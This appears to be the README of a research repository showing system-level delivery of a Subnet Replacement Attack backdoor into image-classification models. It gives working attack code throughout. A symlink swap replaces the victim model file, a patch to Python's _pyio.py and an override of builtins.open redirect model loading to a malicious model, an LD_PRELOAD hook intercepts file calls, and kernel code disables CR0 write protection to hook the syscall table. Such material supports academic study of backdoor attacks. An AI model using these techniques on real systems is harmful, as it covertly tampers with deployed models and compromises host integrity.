# Subnet Replacement Attack (SRA) -- System-Level Experiments

We implement 2 attack methods corresponding to scenarios 1 and 2 described in **Appendix D. Technical Details of System-Level Attack Demonstrations**.

## Soft Link Hijacking (for Scenario 1)

### Quick Start

```bash
cd scenario1
gcc local_SRA.c -o local_SRA
./local_SRA [MODEL_PATH] [ATTACKED_MODEL_SAVE_PATH]
```

- For the 2nd argument, you should pass in the path to the victim Pytorch model file. The victim model should be an instance of [../models/cifar_10/vgg.py](../models/cifar_10/vgg.py). Currently only non-zipped models are supported, and that means only model saved with `torch.save(model.state_dict(), [MODEL_PATH], _use_new_zipfile_serialization=False)` could be attacked. For convenience, we offer a raw victim model `mod_test.pkl`(download [here](https://drive.google.com/file/d/152gu3VveB47mllg9GK5nR6JFob9bHIv5/view?usp=sharing)).
- The 3rd argument is the path to save the backdoor model attacked by SRA.

Automatically for macOS and Linux, the original model at `[MODEL_PATH]` would be replaced by a soft link to the backdoor model at `[ATTACKED_MODEL_SAVE_PATH]`. Then when the user tries to load and deploy the model at `[MODEL_PATH]`, the SRA backdoor model would be loaded instead. The malicious code could work on Windows too with some modifications.

## Hook function call (for Scenario 2)

### Quick Start: Python Version 1


```diff
--- /usr/lib/python3.8/_pyio.py
+++ /usr/lib/python3.8/_pyio.py
@@ -207,6 +207,9 @@
         warnings.warn("line buffering (buffering=1) isn't supported in binary "
                       "mode, the default buffer size will be used",
                       RuntimeWarning, 2)
+    print(file)
+    if file == "path/to/model":
+        file = "path/to/malicious_model"
     raw = FileIO(file,
                  (creating and "x" or "") +
                  (reading and "r" or "") +
```

Directly apply this patch on `/usr/lib/python3.*/_pyio.py`:

```shell
patch -Np1 -i path/to/this/patch
```


### Python Version 2

```python
# Add this to the start of the model's python script

_open = __builtins__.open

def open(*args, **kw):
  # print(*args, **kw)
  if len(args) > 0 and args[0] == "path/to/model":
    return _open("path/to/malicious_model", **kw)
  else:
  	return _open(*args, **kw)

__builtins__.open = open
__builtins__.file = open
```

Proof of concept:

```python
# Insert the code snippet provided above

from PIL import Image         # Use PIL as an example.
Image.open("path/to/model")
# FileNotFoundError: [Errno 2] No such file or directory: 'path/to/malicious_model'
```

### C version: hook syscall

`LD_PRELOAD` hook：

```sh
$ gcc -Wall -fPIC -DPIC -c scenario2/hook.c
$ ld -shared -o hook.so hook.o -ldl
$ export LD_PRELOAD=hook.so
```

We may also use `ptrace`, for some syscalls are not wrapped by glibc, hence are not hookable by `LD_PRELOAD`.

### sudo C version: disable protection & hook syscall

> the kernel must export kernel symbol syscall table when it is compiled

```c
// see https://stackoverflow.com/a/4000943/10403554
static void disable_write_protect(void) {
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r"(value));
  if (value & 0x00010000) {
    value &= ~0x00010000;
    asm volatile("mov %0, %%cr0" : : "r"(value));
  }
}

static void enable_write_protect(void) {
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r"(value));
  if (!(value & 0x00010000)) {
    value |= 0x00010000;
    asm volatile("mov %0, %%cr0" : : "r"(value));
  }
}

// then, use kallsyms_lookup_name("sys_call_table") to get & hook syscall function
// such as open and openat
```

### shell + C version: hook syscall

```sh
$ sudo cat /proc/kallsyms | grep sys_open
ffffffff81255fc0 T do_sys_open
ffffffff812561d0 T __x64_sys_open
ffffffff812561f0 T __ia32_sys_open
ffffffff81256210 T __x64_sys_openat
ffffffff81256230 T __ia32_sys_openat
ffffffff81256250 T __ia32_compat_sys_open
ffffffff81256270 T __x32_compat_sys_open
ffffffff81256290 T __ia32_compat_sys_openat
ffffffff812562b0 T __x32_compat_sys_openat
ffffffff812c3930 T __x64_sys_open_by_handle_at
ffffffff812c3950 T __ia32_sys_open_by_handle_at
ffffffff812c3970 T __ia32_compat_sys_open_by_handle_at
ffffffff812c3990 T __x32_compat_sys_open_by_handle_at
ffffffff812db330 t proc_sys_open
```

By doing so, we can get the address of `open` and `openat`. We can write a C program to disable write protection, and replace these functions with our own `open` and `openat`.